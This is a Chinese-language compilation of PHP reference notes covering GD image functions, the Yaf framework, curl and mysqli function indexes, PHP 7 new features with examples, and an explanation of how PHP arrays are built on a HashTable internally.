imagecopymerge — 拷贝并合并图像的一部分
imagecopymergegray — 用灰度拷贝并合并图像的一部分
imagecopyresampled — 重采样拷贝部分图像并调整大小
imagecopyresized — 拷贝部分图像并调整大小
imagecreate — 新建一个基于调色板的图像
imagecreatefrombmp — 由文件或 URL 创建一个新图象。
imagecreatefromgd2 — 从 GD2 文件或 URL 新建一图像
imagecreatefromgd2part — 从给定的 GD2 文件或 URL 中的部分新建一图像
imagecreatefromgd — 从 GD 文件或 URL 新建一图像
imagecreatefromgif — 由文件或 URL 创建一个新图象。
imagecreatefromjpeg — 由文件或 URL 创建一个新图象。
imagecreatefrompng — 由文件或 URL 创建一个新图象。
imagecreatefromstring — 从字符串中的图像流新建一图像
imagecreatefromwbmp — 由文件或 URL 创建一个新图象。
imagecreatefromwebp — 由文件或 URL 创建一个新图象。
imagecreatefromxbm — 由文件或 URL 创建一个新图象。
imagecreatefromxpm — 由文件或 URL 创建一个新图象。
imagecreatetruecolor — 新建一个真彩色图像
imagecrop — Crop an image to the given rectangle
imagecropauto — Crop an image automatically using one of the available modes
imagedashedline — 画一虚线
imagedestroy — 销毁一图像
imageellipse — 画一个椭圆
imagefill — 区域填充
imagefilledarc — 画一椭圆弧且填充
imagefilledellipse — 画一椭圆并填充
imagefilledpolygon — 画一多边形并填充
imagefilledrectangle — 画一矩形并填充
imagefilltoborder — 区域填充到指定颜色的边界为止
imagefilter — 对图像使用过滤器
imageflip — Flips an image using a given mode
imagefontheight — 取得字体高度
imagefontwidth — 取得字体宽度
imageftbbox — 给出一个使用 FreeType 2 字体的文本框
imagefttext — 使用 FreeType 2 字体将文本写入图像
imagegammacorrect — 对 GD 图像应用 gamma 修正
imagegd2 — 将 GD2 图像输出到浏览器或文件
imagegd — 将 GD 图像输出到浏览器或文件
imagegetclip — Get the clipping rectangle
imagegif — 输出图象到浏览器或文件。
imagegrabscreen — Captures the whole screen
imagegrabwindow — Captures a window
imageinterlace — 激活或禁止隔行扫描
imageistruecolor — 检查图像是否为真彩色图像
imagejpeg — 输出图象到浏览器或文件。
imagelayereffect — 设定 alpha 混色标志以使用绑定的 libgd 分层效果
imageline — 画一条线段
imageloadfont — 载入一新字体
imageopenpolygon — Draws an open polygon
imagepalettecopy — 将调色板从一幅图像拷贝到另一幅
imagepalettetotruecolor — Converts a palette based image to true color
imagepng — 以 PNG 格式将图像输出到浏览器或文件
imagepolygon — 画一个多边形
imagepsbbox — 给出一个使用 PostScript Type1 字体的文本方框
imagepsencodefont — 改变字体中的字符编码矢量
imagepsextendfont — 扩充或精简字体
imagepsfreefont — 释放一个 PostScript Type 1 字体所占用的内存
imagepsloadfont — 从文件中加载一个 PostScript Type 1 字体
imagepsslantfont — 倾斜某字体
imagepstext — 用 PostScript Type1 字体把文本字符串画在图像上
imagerectangle — 画一个矩形
imageresolution — Get or set the resolution of the image
imagerotate — 用给定角度旋转图像
imagesavealpha — 设置标记以在保存 PNG 图像时保存完整的 alpha 通道信息（与单一透明色相反）
imagescale — Scale an image using the given new width and height
imagesetbrush — 设定画线用的画笔图像
imagesetclip — Set the clipping rectangle
imagesetinterpolation — Set the interpolation method
imagesetpixel — 画一个单一像素
imagesetstyle — 设定画线的风格
imagesetthickness — 设定画线的宽度
imagesettile — 设定用于填充的贴图
imagestring — 水平地画一行字符串
imagestringup — 垂直地画一行字符串
imagesx — 取得图像宽度
imagesy — 取得图像高度
imagetruecolortopalette — 将真彩色图像转换为调色板图像
imagettfbbox — 取得使用 TrueType 字体的文本的范围
imagettftext — 用 TrueType 字体向图像写入文本
imagetypes — 返回当前 PHP 版本所支持的图像类型
imagewbmp — 以 WBMP 格式将图像输出到浏览器或文件
imagewebp — 将 WebP 格式的图像输出到浏览器或文件
imagexbm — 将 XBM 图像输出到浏览器或文件
iptcembed — 将二进制 IPTC 数据嵌入到一幅 JPEG 图像中
iptcparse — 将二进制 IPTC 块解析为单个标记
jpeg2wbmp — 将 JPEG 图像文件转换为 WBMP 图像文件
png2wbmp — 将 PNG 图像文件转换为 WBMP 图像文件
```

### yaf
```
[Yet Another Framework
http://php.net/manual/zh/book.yaf.php
使用框架会降低性能, 经常举例的就是Zend Framework，采用框架能提高开发效率, 损失点性能也是值得的。
有的项目组为了性能而选择某些框架，而另外一些项目组,，则为了更好的封装选择了另外的框架。
Yaf框架既不会有损性能, 又能提高开发效率。
Yaf有着和Zend Framework相似的API，相似的理念,，而同时又保持着对Bingo的兼容,，以此来提高开发效率,，规范开发习惯。本着对性能的追求, Yaf把框架中不易变的部分抽象出来，采用PHP扩展实现(c语言)，以此来保证性能。在作者自己做的简单测试中，Yaf和原生的PHP在同样功能下，性能损失小于10%，而和Zend Framework的对比中，Yaf的性能是Zend Framework的50-60倍。
Yaf是一个C语言编写的PHP框架。
Yaf的优点
用C语言开发的PHP框架，相比原生的PHP，几乎不会带来额外的性能开销。
所有的框架类，不需要编译，在PHP启动的时候加载，并常驻内存。
更短的内存周转周期，提高内存利用率，降低内存占用率。
灵巧的自动加载。支持全局和局部两种加载规则，方便类库共享。
高性能的视图引擎。
高度灵活可扩展的框架，支持自定义视图引擎，支持插件，支持自定义路由等等。
内建多种路由, 可以兼容目前常见的各种路由协议.
强大而又高度灵活的配置文件支持. 并支持缓存配置文件, 避免复杂的配置结构带来的性能损失.
在框架本身,对危险的操作习惯做了禁止.
更快的执行速度, 更少的内存占用.
名词解释
1、Yaf Yet Another Framework

| adv. | 用于否定句和疑问句，谈论尚未发生但可能发生的事; 现在; 即刻; 马上; 从现在起直至某一时间; 还; |

| conj. | 但是; 然而; |

[例句]They haven't finished yet

他们还没有完成。

2、API （Application Programming Interface，应用程序编程接口）是一些预先定义的函数，目的是提供应用程序与开发人员基于某软件或硬件得以访问一组例程的能力，而又无需访问源码，或理解内部工作机制的细节。

3、bootstrap v.独自创立; 靠一己之力做成; 附属于; 与…相联系;

```

### curl
```
[Client URL
http://php.net/manual/zh/book.curl.php
Client URL 库
简介
安装／配置
需求
安装
运行时配置
资源类型
预定义常量
范例
curl 基础例子
cURL 函数
curl_close — 关闭 cURL 会话
curl_copy_handle — 复制一个cURL句柄和它的所有选项
curl_errno — 返回最后一次的错误代码
curl_error — 返回当前会话最后一次错误的字符串
curl_escape — 使用 URL 编码给定的字符串
curl_exec — 执行 cURL 会话
curl_file_create — 创建一个 CURLFile 对象
curl_getinfo — 获取一个cURL连接资源句柄的信息
curl_init — 初始化 cURL 会话
curl_multi_add_handle — 向curl批处理会话中添加单独的curl句柄
curl_multi_close — 关闭一组cURL句柄
curl_multi_errno — 返回上一次 curl 批处理的错误码
curl_multi_exec — 运行当前 cURL 句柄的子连接
curl_multi_getcontent — 如果设置了CURLOPT_RETURNTRANSFER，则返回获取的输出的文本流
curl_multi_info_read — 获取当前解析的cURL的相关传输信息
curl_multi_init — 返回一个新cURL批处理句柄
curl_multi_remove_handle — 移除cURL批处理句柄资源中的某个句柄资源
curl_multi_select — 等待所有cURL批处理中的活动连接
curl_multi_setopt — 为 cURL 并行处理设置一个选项
curl_multi_strerror — 返回字符串描述的错误代码
curl_pause — 暂停和取消暂停一个连接。
curl_reset — 重置一个 libcurl 会话句柄的所有的选项
curl_setopt_array — 为 cURL 传输会话批量设置选项
curl_setopt — 设置 cURL 传输选项
curl_share_close — 关闭 cURL 共享句柄
curl_share_errno — 返回共享 curl 句柄的最后一次错误号
curl_share_init — 初始化一个 cURL 共享句柄。
curl_share_setopt — 为 cURL 共享句柄设置选项。
curl_share_strerror — 返回错误号对应的错误消息
curl_strerror — 返回错误代码的字符串描述
curl_unescape — 解码给定的 URL 编码的字符串
curl_version — 获取 cURL 版本信息
CURLFile — CURLFile 类
CURLFile::__construct — 创建 CURLFile 对象
CURLFile::getFilename — 获取被上传文件的 文件名
CURLFile::getMimeType — 获取被上传文件的 MIME 类型
CURLFile::getPostFilename — 获取 POST 请求时使用的 文件名
CURLFile::setMimeType — 设置被上传文件的 MIME 类型
CURLFile::setPostFilename — 设置 POST 请求时使用的文件名
CURLFile::__wakeup — 反序列化句柄
```

### mysqli
```
[mysql增强版
http://php.net/manual/zh/book.mysqli.php
MySQL增强版扩展
简介
Overview
Quick start guide
Dual procedural and object-oriented interface
Connections
Executing statements
Prepared Statements
Stored Procedures
Multiple Statements
API support for transactions
Metadata
安装／配置
需求
安装
运行时配置
资源类型
mysqli 扩展和持久化连接
预定义常量
Notes
MySQLi 扩展的功能概述
MySQLi — MySQLi类
mysqli::$affected_rows — Gets the number of affected rows in a previous MySQL operation
mysqli::autocommit — 打开或关闭本次数据库连接的自动命令提交事务模式
mysqli::begin_transaction — Starts a transaction
mysqli::change_user — Changes the user of the specified database connection
mysqli::character_set_name — 返回当前数据库连接的默认字符编码
mysqli::close — 关闭先前打开的数据库连接
mysqli::commit — 提交一个事务
mysqli::$connect_errno — Returns the error code from last connect call
mysqli::$connect_error — Returns a string description of the last connect error
mysqli::__construct — Open a new connection to the MySQL server
mysqli::debug — Performs debugging operations
mysqli::dump_debug_info — 将调试信息输出到日志
mysqli::errno — 返回最近函数调用的错误代码
mysqli::$error_list — Returns a list of errors from the last command executed
mysqli::$error — Returns a string description of the last error
mysqli::$field_count — Returns the number of columns for the most recent query
mysqli::get_charset — Returns a character set object
mysqli::$client_info — 获取 MySQL 客户端信息
mysqli_get_client_version — 作为一个整数返回MySQL客户端的版本
mysqli::get_connection_stats — 返回客户端连接的统计数据
mysqli::$host_info — 返回一个表述使用的连接类型的字符串
mysqli::$protocol_version — 返回MySQL使用的协议版本号
mysqli::$server_info — 返回MySQL服务器的版本号
mysqli::$server_version — 作为一个整数返回MySQL服务器的版本
mysqli::get_warnings — Get result of SHOW WARNINGS
mysqli::$info — 返回最近执行的 SQL 语句的信息
mysqli::init — 初始化 MySQLi 并返回一个资源类型的值，这个值可以作为 mysqli_real_connect() 函数的传入参数
mysqli::$insert_id — 返回最后一条插入语句产生的自增 ID
mysqli::kill — 让服务器杀掉一个 MySQL 线程
mysqli::more_results — 检查批量查询中是否还有查询结果
mysqli::multi_query — 执行查询
mysqli::next_result — 为读取 multi_query 执行之后的下一个结果集做准备
mysqli::options — 设置选项
mysqli::ping — ping 一个连接，或者如果连接处于断开状态，重新连接
mysqli::poll — 轮询连接
mysqli::prepare — 准备执行一个 SQL 语句
mysqli::query — 对数据库执行一次查询
mysqli::real_connect — 建立一个 MySQL 服务器连接
mysqli::real_escape_string — 根据当前连接的字符集，对于 SQL 语句中的特殊字符进行转义
mysqli::real_query — 执行一个mysql查询
mysqli::reap_async_query — 获取异步查询的结果
mysqli::refresh — 刷新
mysqli::release_savepoint — 从当前事务的保存点中移除一个命名保存点
mysqli::rollback — 回退当前事务
mysqli::rpl_query_type — 返回 RPL 查询类型
mysqli::savepoint — 在当前事务中增加一个命名保存点
mysqli::select_db — 选择用于数据库查询的默认数据库
mysqli::send_query — 发送请求并返回结果
mysqli::set_charset — 设置默认字符编码
mysqli::set_local_infile_default — 取消用户指定的回调函数
mysqli::set_local_infile_handler — 设置 LOAD DATA LOCAL INFILE 命令的回调函数
mysqli::$sqlstate — 返回上一次 SQL 操作的 SQLSTATE 错误信息
mysqli::ssl_set — 使用 SSL 建立到数据库之间的安全连接
mysqli::stat — 获取当前系统状态信息
mysqli::stmt_init — 初始化一条语句并返回一个用于mysqli_stmt_prepare(调用)的对象
mysqli::store_result — 转移上一次查询返回的结果集
mysqli::$thread_id — 返回当前连接的线程 ID
mysqli::thread_safe — 返回是否是线程安全的
mysqli::use_result — Initiate a result set retrieval
mysqli::$warning_count — Returns the number of warnings from the last query for the given link
MySQLi_STMT — MySQLi_STMT类
mysqli_stmt::$affected_rows — Returns the total number of rows changed, deleted, or inserted by the last executed statement
mysqli_stmt::attr_get — Used to get the current value of a statement attribute
mysqli_stmt::attr_set — Used to modify the behavior of a prepared statement
mysqli_stmt::bind_param — Binds variables to a prepared statement as parameters
mysqli_stmt::bind_result — Binds variables to a prepared statement for result storage
mysqli_stmt::close — Closes a prepared statement
mysqli_stmt::__construct — Constructs a new mysqli_stmt object
mysqli_stmt::data_seek — Seeks to an arbitrary row in statement result set
mysqli_stmt::$errno — Returns the error code for the most recent statement call
mysqli_stmt::$error_list — Returns a list of errors from the last statement executed
mysqli_stmt::$error — Returns a string description for last statement error
mysqli_stmt::execute — Executes a prepared Query
mysqli_stmt::fetch — Fetch results from a prepared statement into the bound variables
mysqli_stmt::$field_count — Returns the number of field in the given statement
mysqli_stmt::free_result — Frees stored result memory for the given statement handle
mysqli_stmt::get_result — Gets a result set from a prepared statement
mysqli_stmt::get_warnings — Get result of SHOW WARNINGS
mysqli_stmt::$insert_id — Get the ID generated from the previous INSERT operation
mysqli_stmt::more_results — Check if there are more query results from a multiple query
mysqli_stmt::next_result — Reads the next result from a multiple query
mysqli_stmt::$num_rows — Return the number of rows in statements result set
mysqli_stmt::$param_count — Returns the number of parameter for the given statement
mysqli_stmt::prepare — Prepare an SQL statement for execution
mysqli_stmt::reset — Resets a prepared statement
mysqli_stmt::result_metadata — Returns result set metadata from a prepared statement
mysqli_stmt::send_long_data — Send data in blocks
mysqli_stmt::$sqlstate — Returns SQLSTATE error from previous statement operation
mysqli_stmt::store_result — Transfers a result set from a prepared statement
mysqli_result — mysqli_result类
mysqli_result::$current_field — Get current field offset of a result pointer
mysqli_result::data_seek — Adjusts the result pointer to an arbitrary row in the result
mysqli_result::fetch_all — Fetches all result rows as an associative array, a numeric array, or both
mysqli_result::fetch_array — Fetch a result row as an associative, a numeric array, or both
mysqli_result::fetch_assoc — Fetch a result row as an associative array
mysqli_result::fetch_field_direct — Fetch meta-data for a single field
mysqli_result::fetch_field — Returns the next field in the result set
mysqli_result::fetch_fields — Returns an array of objects representing the fields in a result set
mysqli_result::fetch_object — Returns the current row of a result set as an object
mysqli_result::fetch_row — Get a result row as an enumerated array
mysqli_result::$field_count — Get the number of fields in a result
mysqli_result::field_seek — Set result pointer to a specified field offset
mysqli_result::free — Frees the memory associated with a result
mysqli_result::$lengths — Returns the lengths of the columns of the current row in the result set
mysqli_result::$num_rows — Gets the number of rows in a result
MySQLi_Driver — MySQLi_Driver类
mysqli_driver::embedded_server_end — Stop embedded server
mysqli_driver::embedded_server_start — Initialize and start embedded server
mysqli_driver::$report_mode — Enables or disables internal report functions
MySQLi_Warning — MySQLi_Warning类
mysqli_warning::__construct — The __construct purpose
mysqli_warning::next — Fetch next warning
mysqli_sql_exception — mysqli异常类
别名和过时的 Mysqli 函数
mysqli_bind_param — mysqli_stmt_bind_param 的别名
mysqli_bind_result — mysqli_stmt_bind_result 的别名
mysqli_client_encoding — mysqli_character_set_name 的别名
mysqli_connect — 别名 mysqli::__construct
mysqli::disable_reads_from_master — 在主从服务器结构中，禁用从主机读取数据
mysqli_disable_rpl_parse — 禁用RPL解析
mysqli_enable_reads_from_master — 开启从主机读取
mysqli_enable_rpl_parse — 开启RPL解析
mysqli_escape_string — 别名 mysqli_real_escape_string
mysqli_execute — mysqli_stmt_execute 的别名
mysqli_fetch — mysqli_stmt_fetch 的别名。
mysqli_get_cache_stats — 返回客户端Zval缓存统计信息
mysqli_get_client_stats — 返回客户端进程统计信息
mysqli_get_links_stats — 返回打开和缓存的链接相关信息
mysqli_get_metadata — mysqli_stmt_result_metadata 的别名
mysqli_master_query — 在主/从机制中强制在主机中执行一个查询
mysqli_param_count — mysqli_stmt_param_count 的别名
mysqli_report — 别名 mysqli_driver->report_mode
mysqli_rpl_parse_enabled — 检查是否开启了 RPL 解析
mysqli_rpl_probe — RPL 探测
mysqli_send_long_data — mysqli_stmt_send_long_data 的别名
mysqli::set_opt — Alias of mysqli_options
mysqli_slave_query — 在主/从机制中强制在从机上执行一个查询
```

### php7
```
[php7新特性
http://www.runoob.com/w3cnote/php7-new-features.html
PHP 7 新特性
分类 PHP 常用实例
标量类型声明
PHP 7 中的函数的形参类型声明可以是标量了。在 PHP 5 中只能是类名、接口、array 或者 callable (PHP 5.4，即可以是函数，包括匿名函数)，现在也可以使用 string、int、float和 bool 了。

<?php
// 强制模式
function sumOfInts(int ...$ints)
{
    return array_sum($ints);
}

var_dump(sumOfInts(2, '3', 4.1));
以上实例会输出：

int(9)
需要注意的是上文提到的严格模式的问题在这里同样适用：强制模式（默认，既强制类型转换）下还是会对不符合预期的参数进行强制类型转换，严格模式下则触发 TypeError 的致命错误。

返回值类型声明
PHP 7 增加了对返回类型声明的支持。 类似于参数类型声明，返回类型声明指明了函数返回值的类型。可用的类型与参数声明中可用的类型相同。

<?php

function arraysSum(array ...$arrays): array
{
    return array_map(function(array $array): int {
        return array_sum($array);
    }, $arrays);
}

print_r(arraysSum([1,2,3], [4,5,6], [7,8,9]));
以上实例会输出：

Array
(
    [0] => 6
    [1] => 15
    [2] => 24
)
NULL 合并运算符
由于日常使用中存在大量同时使用三元表达式和 isset()的情况，NULL 合并运算符使得变量存在且值不为NULL， 它就会返回自身的值，否则返回它的第二个操作数。

实例如下：

<?php
// 如果 $_GET['user'] 不存在返回 'nobody'，否则返回 $_GET['user'] 的值
$username = $_GET['user'] ?? 'nobody';
// 类似的三元运算符
$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';
?>
太空船操作符（组合比较符）
太空船操作符用于比较两个表达式。当$a大于、等于或小于$b时它分别返回-1、0或1。

实例如下：

<?php
// 整型
echo 1 <=> 1; // 0
echo 1 <=> 2; // -1
echo 2 <=> 1; // 1

// 浮点型
echo 1.5 <=> 1.5; // 0
echo 1.5 <=> 2.5; // -1
echo 2.5 <=> 1.5; // 1
 
// 字符串
echo "a" <=> "a"; // 0
echo "a" <=> "b"; // -1
echo "b" <=> "a"; // 1
?>
通过 define() 定义常量数组
实例如下：

<?php
define('ANIMALS', [
    'dog',
    'cat',
    'bird'
]);

echo ANIMALS[1]; // 输出 "cat"
?>
匿名类
现在支持通过new class 来实例化一个匿名类，实例如下：

<?php
interface Logger {
    public function log(string $msg);
}

class Application {
    private $logger;

    public function getLogger(): Logger {
         return $this->logger;
    }

    public function setLogger(Logger $logger) {
         $this->logger = $logger;
    }
}

$app = new Application;
$app->setLogger(new class implements Logger {
    public function log(string $msg) {
        echo $msg;
    }
});

var_dump($app->getLogger());
?>
以上实例会输出：

object(class@anonymous)#2 (0) {
}
Unicode codepoint 转译语法
这接受一个以16进制形式的 Unicode codepoint，并打印出一个双引号或heredoc包围的 UTF-8 编码格式的字符串。 可以接受任何有效的 codepoint，并且开头的 0 是可以省略的。

echo "\u{aa}";
echo "\u{0000aa}";
echo "\u{9999}";
以上实例会输出：

ª
ª (same as before but with optional leading 0's)
香
Closure::call()
Closure::call() 现在有着更好的性能，简短干练的暂时绑定一个方法到对象上闭包并调用它。

<?php
class A {private $x = 1;}

// Pre PHP 7 代码
$getXCB = function() {return $this->x;};
$getX = $getXCB->bindTo(new A, 'A'); // intermediate closure
echo $getX();

// PHP 7+ 代码
$getX = function() {return $this->x;};
echo $getX->call(new A);
以上实例会输出：

1
1
为unserialize()提供过滤
这个特性旨在提供更安全的方式解包不可靠的数据。它通过白名单的方式来防止潜在的代码注入。

<?php

// 转换对象为 __PHP_Incomplete_Class 对象
$data = unserialize($foo, ["allowed_classes" => false]);

// 转换对象为 __PHP_Incomplete_Class 对象，除了 MyClass 和 MyClass2
$data = unserialize($foo, ["allowed_classes" => ["MyClass", "MyClass2"]);

// 默认接受所有类
$data = unserialize($foo, ["allowed_classes" => true]);
IntlChar
新增加的 IntlChar 类旨在暴露出更多的 ICU 功能。这个类自身定义了许多静态方法用于操作多字符集的 unicode 字符。

<?php
printf('%x', IntlChar::CODEPOINT_MAX);
echo IntlChar::charName('@');
var_dump(IntlChar::ispunct('!'));
以上实例会输出：

10ffff
COMMERCIAL AT
bool(true)
若要使用此类，请先安装Intl扩展

预期
预期是向后兼用并增强之前的 assert() 的方法。 它使得在生产环境中启用断言为零成本，并且提供当断言失败时抛出特定异常的能力。

<?php
ini_set('assert.exception', 1);

class CustomError extends AssertionError {}

assert(false, new CustomError('Some error message'));
?>
以上实例会输出：

Fatal error: Uncaught CustomError: Some error message
use 加强
从同一 namespace 导入的类、函数和常量现在可以通过单个 use 语句 一次性导入了。

<?php

//  PHP 7 之前版本用法
use some\namespace\ClassA;
use some\namespace\ClassB;
use some\namespace\ClassC as C;

use function some\namespace\fn_a;
use function some\namespace\fn_b;
use function some\namespace\fn_c;

use const some\namespace\ConstA;
use const some\namespace\ConstB;
use const some\namespace\ConstC;

// PHP 7+ 用法
use some\namespace\{ClassA, ClassB, ClassC as C};
use function some\namespace\{fn_a, fn_b, fn_c};
use const some\namespace\{ConstA, ConstB, ConstC};
?>
Generator 加强
增强了Generator的功能，这个可以实现很多先进的特性

<?php
<?php

function gen()
{
    yield 1;
    yield 2;

    yield from gen2();
}

function gen2()
{
    yield 3;
    yield 4;
}

foreach (gen() as $val)
{
    echo $val, PHP_EOL;
}

?>
以上实例会输出：
整除
新增了整除函数 intdiv(),使用实例：

<?php
var_dump(intdiv(10, 3));
?>
以上实例会输出：

int(3)
```

### PHP 数组底层实现 （HashTable + Linked list）
```
https://zhuanlan.zhihu.com/p/97762122
数组在 PHP 中非常强大、灵活的一种数据类型，和 Java、C 等静态语言不同，我们在初始化 PHP 数组的时候不必指定大小和存储数据的类型，在赋值的时候可以通过数字索引，也可以通过字符串索引的方式：


基于 PHP 数组的强大特性，我们可以轻易实现更加复杂的数据结构，比如栈、队列、列表、集合、字典等。PHP 数组功能之所以如此强大，得益于底层基于散列表实现。

PHP数组底层数据结构

PHP 数组底层依赖的散列表数据结构定义如下（位于 Zend/zend_types.h）：


这个散列表中有很多成员，我们挑几个比较重要的来讲讲：

arData：散列表中保存存储元素的数组，其内存是连续的，arData指向数组的起始位置；
nTableSize：数组的总容量，即可以容纳的元素数，arData 的内存大小就是根据这个值确定的，它的大小的是2的幂次方，最小为8，然后按照 8、16、32...依次递增；
nTableMask：这个值在散列函数根据 key 的哈希值映射元素的时候用到，它的值实际就是 nTableSize 的负数，即 nTableMask = -nTableSize，用位运算来表示就是 nTableMask = ~nTableSize+1；
nNumUsed、nNumOfElements：nNumUsed 是指数组当前使用的 Bucket 数，但不是数组有效元素个数，因为某个数组元素被删除后并没有立即从数组中删除，而是将其标记为 IS_UNDEF，只有在数组需要扩容时才会真正删除，nNumOfElements 则表示数组中有效的元素数量，即调用 count 函数返回值，如果没有扩容，nNumUsed 一直递增，无论是否删除元素；
nNextFreeElement：这个是给自动确定数值索引使用的，默认从 0 开始，比如 $arr[] = 200，这个时候 nNextFreeElement 值会自动加 1；
pDestructor：当删除或覆盖数组中的某个元素时，如果提供了这个函数句柄，则在删除或覆盖时调用此函数，对旧元素进行清理；
u：这个联合体结构主要用于一些辅助作用
Bucket 的结构比较简单，主要用来保存元素的 key 和 value，以及一个整型的 h（散列值，或者叫哈希值）：如果元素是数值索引，则其值就是数值索引的值；如果是字符串索引，那么其值就是 key 通过 Time33 算法计算得到的散列值，h 的值用来最终映射元素的存储位置。Bucket 的数据结构如下：




PHP 数组的基本实现

散列表主要由两部分组成：存储元素数组、散列函数。散列表的基本实现前面已经探讨过，PHP 中的数组除了具备散列表的基本特点之外，还有一个特别的地方，那就是它是有序的（与Java中的HashMap的无序有所不同）：数组中各元素的顺序和插入顺序一致。这个是怎么实现的呢？

为了实现 PHP 数组的有序性，PHP 底层的散列表在散列函数与元素数组之间加了一层映射表，这个映射表也是一个数组，大小和存储元素的数组相同，存储元素的类型为整型，用于保存元素在实际存储的有序数组中的下标 —— 元素按照先后顺序依次插入实际存储数组，然后将其数组下标按照散列函数散列出来的位置存储在新加的映射表中：


这样，就可以完成最终存储数据的有序性了。

PHP 数组底层结构中并没有显式标识这个中间映射表，而是与 arData 放到了一起，在数组初始化的时候并不仅仅分配用于存储 Bucket 的内存，还会分配相同数量的 uint32_t 大小的空间，这两块空间是一起分配的，然后将 arData 偏移到存储元素数组的位置，而这个中间映射表就可以通过 arData 向前访问到。

数组的初始化

数组的初始化主要是针对 HashTable 成员的设置，初始化时并不会立即分配 arData 的内存，插入第一个元素之后才会分配 arData 的内存。初始化操作可以通过 zend_hash_init 宏完成，最后由 _zend_hash_init_int 函数处理（该函数定义在 Zend/zend_hash.c 文件中）：




此时的 HashTable 只是设置了散列表的大小及其他成员的初始值，还无法用来存储元素。

插入数据

插入时会检查数组是否已经分配存储空间，因为初始化并没有实际分配 arData 的内存，在第一次插入时才会根据 nTableSize 的大小分配，分配以后会把 HashTable->u.flags 打上 HASH_FLAG_INITIALIZED 掩码，这样，下次插入时发现已经分配了就不会重复操作，这段检查逻辑位于 _zend_hash_add_or_update_i 函数中：

if (UNEXPECTED(!(HT_FLAGS(ht) & HASH_FLAG_INITIALIZED))) {
    zend_hash_real_init_mixed(ht);
    if (!ZSTR_IS_INTERNED(key)) {
        zend_string_addref(key);
        HT_FLAGS(ht) &= ~HASH_FLAG_STATIC_KEYS;
        zend_string_hash_val(key);
    }
    goto add_to_hash;
}
如果 arData 还没有分配，则最终由 zend_hash_real_init_mixed_ex 完成内存分配：




分配完 arData 的内存后就可以进行插入操作了，插入时先将元素按照顺序插入 arData，然后将其在 arData 数组中的位置存储到根据 key 的散列值与 nTableMask 计算得到的中间映射表中的对应位置：


上述只是最基本的插入处理，不涉及已存在数据的覆盖和清理。

哈希冲突

PHP 数组底层的散列表采用链地址法解决哈希冲突，即将冲突的 Bucket 串成链表。

HashTable 中的 Bucket 会记录与它冲突的元素在 arData 数组中的位置，这也是一个链表，冲突元素的保存位置不在 Bucket 结构中，而是保存在了存储元素 zval 的 u2 结构中，即 Bucket.val.u2.next，所以插入时分为以下两步：

// 将映射表中原来的值保存到新 Bucket 中，哈希冲突时会用到（以链表方式解决哈希冲突）
Z_NEXT(p->val) = HT_HASH_EX(arData, nIndex);
// 再把新元素数组存储位置更新到数据表中
// 保存idx：((unit32_t*))(ht->arData)[nIndex] = idx
HT_HASH_EX(arData, nIndex) = HT_IDX_TO_HASH(idx);


数组查找

清楚了 HashTable 的实现和哈希冲突的解决方式之后，查找的过程就比较简单了：首先根据 key 计算出的散列值与 nTableMask 计算得到最终散列值 nIndex，然后根据散列值从中间映射表中得到存储元素在有序存储数组中的位置 idx，接着根据 idx 从有序存储数组（即 arData）中取出 Bucket，遍历该 Bucket，判断 Bucket 的 key 是否是要查找的 key，如果是则终止遍历，否则继续根据 zval.u2.next 遍历比较。

对应的底层源码如下：


删除数据

关于数组数据删除前面我们在介绍散列表中的 nNumUsed 和 nNumOfElements 字段时已经提及过，从数组中删除元素时，并没有真正移除，并重新 rehash，而是当 arData 满了之后，才会移除无用的数据，从而提高性能。即数组在需要扩容的情况下才会真正删除元素：首先检查数组中已删除元素所占比例，如果比例达到阈值则触发重新构建索引的操作，这个过程会把已删除的 Bucket 移除，然后把后面的 Bucket 往前移动补上空位，如果还没有达到阈值则会分配一个原数组大小 2 倍的新数组，然后把原数组的元素复制到新数组上，最后重建索引，重建索引会将已删除的 Bucket 移除。

对应底层代码如下：


除此之外，数组还有很多其他操作，比如复制、合并、销毁、重置等，这些操作对应的代码都位于 zend_hash.c 中，感兴趣的同学可以去看看。

https://www.jb51.net/article/168406.htm
PHP 的数组是一种非常强大灵活的数据类型，在讲它的底层实现之前，先看一下 PHP 的数组都具有哪些特性。

可以使用数字或字符串作为数组健值

1
$arr = [1 => 'ok', 'one' => 'hello'];
可按顺序读取数组

1
2
3
foreach($arr as $key => $value){
 echo $arr[$key];
}
可随机读取数组中的元素
1
2
3
4
5
$arr = [1 => 'ok', 'one' => 'hello', 'a' => 'world'];
 
echo $arr['one'];
 
echo current($arr);
数组的长度是可变的

1
2
3
4
5
$arr = [1, 2, 3];
 
$arr[] = 4;
 
array_push($arr, 5);
正是基于这些特性，我们可以使用 PHP 中的数组轻易的实现集合、栈、列表、字典等多种数据结构。那么这些特性在底层是如何实现的呢？ 这就得从数据结构说起了。

数据结构

PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。
PHP 数组的底层实现是散列表（也叫 hashTable )，散列表是根据键（Key）直接访问内存存储位置的数据结构，它的key - value 之间存在一个映射函数，可以根据 key 通过映射函数得到的散列值直接索引到对应的 value 值，无需通过关键字比较，在理想情况下，不考虑散列冲突，散列表的查找效率是非常高的，时间复杂度是 O(1)。

从源码中我们可以看到 zend_array 的结构如下：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
typedef struct _zend_array zend_array;
typedef struct _zend_array hashTable;
 
struct _zend_array {
  zend_refcounted_h gc;
  union {
    struct {
      ZEND_ENDIAN_LOHI_4(
          zend_uchar  flags,
          zend_uchar  nApplyCount,
          zend_uchar  nIteratorsCount,
          zend_uchar  reserve)
    } v;
    uint32_t flags;
  } u;
  uint32_t     nTableMask; // 哈希值计算掩码，等于nTableSize的负值(nTableMask = -nTableSize)
  Bucket      *arData;   // 存储元素数组，指向第一个Bucket
  uint32_t     nNumUsed;  // 已用Bucket数（含失效的 Bucket）
  uint32_t     nNumOfElements; // 哈希表有效元素数
  uint32_t     nTableSize;   // 哈希表总大小，为2的n次方（包括无效的元素）
  uint32_t     nInternalPointer; // 内部指针，用于遍历
  zend_long     nNextFreeElement; // 下一个可用的数值索引,如:arr[] = 1;arr["a"] = 2;arr[] = 3; 则nNextFreeElement = 2;
  dtor_func_t    pDestructor;
};
该结构中的 Bucket 即储存元素的数组，arData 指向数组的起始位置，使用映射函数对 key 值进行映射后可以得到偏移值，通过内存起始位置 + 偏移值即可在散列表中进行寻址操作。

Bucket 的数据结构如下：

1
2
3
4
5
typedef struct _Bucket {
  zval       val; // 存储的具体 value，这里是一个 zval，而不是一个指针
  zend_ulong    h;  // 数字 key 或字符串 key 的哈希值。用于查找时 key 的比较  
